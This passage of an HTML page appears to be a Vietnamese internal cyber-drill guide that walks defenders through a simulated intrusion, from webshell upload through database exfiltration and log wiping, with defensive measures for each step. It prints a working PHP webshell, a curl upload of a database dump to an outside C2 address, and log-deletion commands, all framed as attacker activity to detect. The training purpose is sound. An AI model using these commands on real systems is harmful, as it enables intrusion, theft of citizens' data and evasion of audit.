+          <div class="th">adminIT 5523  0.8  1.5  -bash  ← session đang hoạt động</div>
+        </div>
+      </div>
+      <div class="warn-box">
+        <b>⚠ Dấu hiệu:</b> Login SSH từ nguồn IP không phải máy admin bình thường. Giờ đăng nhập 10:38 bình thường nhưng kết hợp với nguồn IP bất thường là Red Flag. <b>Bật MFA cho SSH</b> sẽ ngăn bước này.
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- STEP 7 -->
+<div class="guide-section" id="step7">
+  <div class="section-header">
+    <div class="section-num" style="background:rgba(255,166,87,.15);color:var(--orange)">7</div>
+    <div>
+      <h2>Collection — Upload Webshell</h2>
+      <span class="phase-label" style="background:rgba(255,166,87,.12);color:var(--orange)">COLLECTION · T1505.003 · T+1:02</span>
+    </div>
+  </div>
+  <div class="step-card">
+    <div class="step-body">
+      <div class="term-block">
+        <div class="term-header"><div class="term-machine tm-web">WEB-SERVER · Bash</div><span>Phân tích webshell</span></div>
+        <div class="term-body">
+          <div><span class="tp">adminIT@web-server:~$ </span><span class="tc">ls -la /var/www/html/uploads/</span></div>
+          <div class="to">drwxr-xr-x 2 www-data www-data  4096 Apr  1 10:00 .</div>
+          <div class="th">-rw-r--r-- 1 www-data www-data  2148 Apr 10 11:02 img_cache.php  ← WEBSHELL!</div>
+          <div style="margin-top:8px"></div>
+          <div><span class="tp">adminIT@web-server:~$ </span><span class="tc">cat /var/www/html/uploads/img_cache.php</span></div>
+          <div class="th">&lt;?php if(isset($_GET['cmd'])) { system(base64_decode($_GET['cmd'])); } ?&gt;</div>
+          <div class="tg"># Webshell nhận lệnh qua parameter ?cmd= và thực thi!</div>
+          <div style="margin-top:8px"></div>
+          <div><span class="tp">adminIT@web-server:~$ </span><span class="tc">cat /var/log/apache2/access.log | grep img_cache</span></div>
+          <div class="th">192.168.1.100 - "GET /uploads/img_cache.php?cmd=aWQ= HTTP/1.1" 200</div>
+          <div class="tg"># base64_decode("aWQ=") = "id" → kẻ tấn công test webshell</div>
+          <div style="margin-top:8px"></div>
+          <div><span class="tp">adminIT@web-server:~$ </span><span class="tc">find /var/www -name "*.php" -newer /etc/passwd</span></div>
+          <div class="th">/var/www/html/uploads/img_cache.php  ← file mới, không có trong baseline!</div>
+        </div>
+      </div>
+      <div class="info-box">
+        <b>💡 Phòng thủ:</b> Thư mục /uploads/ không nên cho phép thực thi PHP. Cấu hình Apache: <code style="background:rgba(255,255,255,.1);padding:1px 5px;border-radius:3px">php_flag engine off</code> trong thư mục uploads. Dùng AIDE/Tripwire để phát hiện file mới trong webroot.
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- STEP 8 -->
+<div class="guide-section" id="step8">
+  <div class="section-header">
+    <div class="section-num" style="background:rgba(88,166,255,.15);color:var(--blue)">8</div>
+    <div>
+      <h2>Exfiltration — Đánh cắp dữ liệu DB</h2>
+      <span class="phase-label" style="background:rgba(88,166,255,.12);color:var(--blue)">EXFILTRATION · T1005 + T1041 · T+1:18</span>
+    </div>
+  </div>
+  <div class="step-card">
+    <div class="step-body">
+      <div style="font-size:12px;color:var(--text2);margin-bottom:12px">Chuyển sang máy <b>DB-SERVER</b> để quan sát</div>
+      <div class="term-block">
+        <div class="term-header"><div class="term-machine tm-db">DB-SERVER · MySQL</div><span>Phân tích database access</span></div>
+        <div class="term-body">
+          <div><span class="tp">mysql [citizens_db]&gt; </span><span class="tc">show processlist;</span></div>
+          <div class="th">45  www-data  192.168.1.10:33891  citizens_db  Query  "SELECT * FROM citizens"  ← ALERT!</div>
+          <div style="margin-top:8px"></div>
+          <div><span class="tp">mysql [citizens_db]&gt; </span><span class="tc">select count(*) from citizens;</span></div>
+          <div class="th">150247  ← 150.247 bản ghi dữ liệu công dân đang bị truy vấn!</div>
+          <div style="margin-top:8px"></div>
+          <div><span class="tp">mysql [citizens_db]&gt; </span><span class="tc">desc citizens;</span></div>
+          <div class="to">ho_ten | cccd | ngay_sinh | dia_chi | dien_thoai  ← dữ liệu cá nhân nhạy cảm!</div>
+          <div style="margin-top:8px"></div>
+          <div class="to"># Từ webshell (kẻ tấn công thực hiện):</div>
+          <div class="th">mysqldump citizens_db &gt; /tmp/data.sql.gz  (8.2MB)</div>
+          <div class="th">curl -F "file=@/tmp/data.sql.gz" http://45.134.212.77/upload</div>
+          <div class="tg"># 8.2MB chứa toàn bộ CSDL gửi về C2 server!</div>
+        </div>
+      </div>
+      <div class="warn-box">
+        <b>⚠ Thiệt hại thực tế:</b> 150.247 hồ sơ dữ liệu công dân bao gồm họ tên, CCCD, ngày sinh, địa chỉ, số điện thoại — đủ để thực hiện giả mạo danh tính và lừa đảo quy mô lớn.
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- STEP 9 -->
+<div class="guide-section" id="step9">
+  <div class="section-header">
+    <div class="section-num" style="background:rgba(139,148,158,.15);color:var(--text2)">9</div>
+    <div>
+      <h2>Cover Tracks — Xóa dấu vết</h2>
+      <span class="phase-label" style="background:rgba(139,148,158,.12);color:var(--text2)">IMPACT / COVER · T1070 · T+1:35</span>
+    </div>
+  </div>
+  <div class="step-card">
+    <div class="step-body">
+      <div class="term-block">
+        <div class="term-header"><div class="term-machine tm-web">WEB-SERVER</div><span>Red Team — Xóa log</span></div>
+        <div class="term-body">
+          <div class="to"># Kẻ tấn công xóa dấu vết trên Web Server:</div>
+          <div class="th">rm /var/log/apache2/access.log /var/log/apache2/error.log</div>
+          <div class="th">rm /var/www/html/uploads/img_cache.php</div>
+          <div class="th">history -c && unset HISTFILE</div>
+          <div style="margin-top:8px"></div>
+          <div class="to"># Xóa trên DB Server:</div>
+          <div class="th">mysql -e "DELETE FROM mysql.general_log;"</div>
+          <div class="th">rm /tmp/data.sql.gz</div>
+          <div class="th">history -c</div>
+          <div style="margin-top:8px"></div>
+          <div class="tg"># NHƯNG — SIEM đã forward log realtime → bản ghi vẫn tồn tại!</div>
+          <div class="tg"># kern.log cũng không bị xóa vì cần quyền root đặc biệt</div>
+        </div>
+      </div>
+      <div class="success-box">
+        <b>✅ Biện pháp phòng thủ quan trọng nhất:</b> Cấu hình <b>rsyslog/syslog-ng</b> forward log realtime về SIEM server riêng. Kẻ tấn công xóa log local không ảnh hưởng đến bản sao trên SIEM. Nguyên tắc: <i>"Cannot delete what you do not control."</i>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- DEFENSE SECTION -->
+<div class="guide-section" id="defense">
+  <div class="section-header">
+    <div class="section-num" style="background:rgba(63,185,80,.15);color:var(--green)">🛡️</div>
+    <h2>Biện pháp Phòng thủ theo từng bước</h2>
+  </div>
+  <div style="display:flex;flex-direction:column;gap:8px">
+    <div class="def-row">
+      <div class="def-icon">📧</div>
+      <div class="def-body">
+        <div class="def-title">Bước 1 — Email Phishing</div>
+        <div class="def-text">Email Gateway lọc file .exe trong attachment. Cấu hình SPF/DKIM/DMARC cho domain nội bộ. Đào tạo nhân viên nhận biết phishing — kiểm tra domain trước khi mở file.</div>
+      </div>
+    </div>
+    <div class="def-row">
+      <div class="def-icon">🔒</div>
+      <div class="def-body">
+        <div class="def-title">Bước 2 — Execution</div>
+        <div class="def-text">Application Allowlisting (chỉ cho phép chạy file từ thư mục được phép). EDR solution (CrowdStrike, SentinelOne) phát hiện process trong %TEMP%. Chặn outbound port 4444 tại firewall.</div>
+      </div>
+    </div>
+    <div class="def-row">
+      <div class="def-icon">🔑</div>
+      <div class="def-body">
+        <div class="def-title">Bước 3–4 — Persistence & Credential Dump</div>
+        <div class="def-text">Sysmon ghi lại Registry modifications. Bật Credential Guard (Windows 10+) để bảo vệ LSASS. Tắt WDigest để ngăn cleartext credential lưu trong memory. Cấu hình lsass.exe run as Protected Process.</div>
+      </div>
+    </div>
+    <div class="def-row">
+      <div class="def-icon">🌐</div>
+      <div class="def-body">
+        <div class="def-title">Bước 5–6 — Network Scan & Lateral Movement</div>
+        <div class="def-text">Network segmentation: client PC và server ở VLAN riêng, không SSH trực tiếp được. Bắt buộc MFA cho SSH admin. IDS/IPS phát hiện và block port scan. Chính sách: không dùng password đơn giản cho account cao quyền.</div>
+      </div>
+    </div>
+    <div class="def-row">
+      <div class="def-icon">🐚</div>
+      <div class="def-body">
+        <div class="def-title">Bước 7 — Webshell</div>
+        <div class="def-text">Thư mục /uploads/ cấu hình <code style="background:var(--bg3);padding:1px 4px;border-radius:3px;color:var(--orange)">php_flag engine off</code>. File integrity monitoring (AIDE) cảnh báo khi có file mới trong webroot. WAF rule phát hiện <code>?cmd=</code> trong request.</div>
+      </div>
+    </div>
+    <div class="def-row">
+      <div class="def-icon">🗄️</div>
+      <div class="def-body">
+        <div class="def-title">Bước 8–9 — Exfiltration & Cover Tracks</div>
+        <div class="def-text">DLP (Data Loss Prevention) theo dõi data transfer khối lượng lớn ra ngoài. MySQL general_log bật để audit query. Log forwarding realtime về SIEM — không thể xóa log từ xa. Database firewall: chỉ cho phép app server kết nối DB.</div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- SUMMARY TABLE -->
+<div class="guide-section" id="summary">
+  <div class="section-header">
+    <div class="section-num" style="background:rgba(88,166,255,.15);color:var(--blue)">📊</div>
+    <h2>Bảng tóm tắt Kill Chain</h2>
+  </div>
+  <table class="summary-table">
+    <thead>
+      <tr><th>Bước</th><th>Phase</th><th>Lệnh / Kỹ thuật chính</th><th>Máy</th><th>MITRE</th></tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td style="font-weight:700;color:var(--red)">1</td>
+        <td>Initial Access</td>
+        <td>Double-click file .pdf.exe trong email</td>
+        <td>CLIENT</td>
+        <td><code>T1566.001</code></td>
+      </tr>
+      <tr>
+        <td style="font-weight:700;color:var(--red)">2</td>
+        <td>Execution</td>
+        <td><code>tasklist</code> / <code>netstat -an</code> → phát hiện svchost32.exe:4444</td>
+        <td>CLIENT</td>
+        <td><code>T1059.003</code></td>
+      </tr>
+      <tr>
+        <td style="font-weight:700;color:var(--yellow)">3</td>
+        <td>Persistence</td>
+        <td><code>reg query HKLM\...\Run</code> / <code>schtasks /query</code></td>
+        <td>CLIENT</td>
+        <td><code>T1547.001</code></td>
+      </tr>
+      <tr>
+        <td style="font-weight:700;color:var(--yellow)">4</td>
+        <td>Credential Access</td>
+        <td>LSASS dump → EventID 4662, Sysmon Event 10</td>
+        <td>CLIENT</td>
+        <td><code>T1003.001</code></td>
+      </tr>
+      <tr>
+        <td style="font-weight:700;color:var(--purple)">5</td>
+        <td>Discovery</td>
+        <td><code>netstat -an</code> → IDS alert port scan /24</td>
+        <td>CLIENT</td>
+        <td><code>T1046</code></td>
+      </tr>
+      <tr>
+        <td style="font-weight:700;color:var(--orange)">6</td>
+        <td>Lateral Movement</td>
+        <td><code>last</code> / <code>who</code> → SSH login từ .100</td>
+        <td>WEB-SVR</td>
+        <td><code>T1021.004</code></td>
+      </tr>
+      <tr>
+        <td style="font-weight:700;color:var(--orange)">7</td>
+        <td>Collection</td>
+        <td><code>ls -la /uploads/</code> / <code>find</code> → img_cache.php webshell</td>
+        <td>WEB-SVR</td>
+        <td><code>T1505.003</code></td>
+      </tr>
+      <tr>
+        <td style="font-weight:700;color:var(--blue)">8</td>
+        <td>Exfiltration</td>
+        <td><code>show processlist</code> → SELECT * 150K rows → curl upload 8.2MB</td>
+        <td>DB-SVR</td>
+        <td><code>T1005 + T1041</code></td>
+      </tr>
+      <tr>
+        <td style="font-weight:700;color:var(--text2)">9</td>
+        <td>Cover Tracks</td>
+        <td><code>rm /var/log/apache2/*.log</code> / <code>history -c</code></td>
+        <td>WEB+DB</td>
+        <td><code>T1070</code></td>
+      </tr>
+    </tbody>
+  </table>
+</div>
+
+</div><!-- /.container -->
+
+<!-- FOOTER -->
+<div style="background:var(--bg2);border-top:1px solid var(--border);padding:16px;text-align:center;font-size:12px;color:var(--text2);margin-top:40px">
+  Tài liệu diễn tập nội bộ · Phòng An ninh mạng & PCTP · Công an tỉnh Quảng Ninh ·
+  <a href="drill.html" style="color:var(--blue);text-decoration:none">▶ Vào Diễn Tập</a>
+</div>
+
+</body>
+</html>
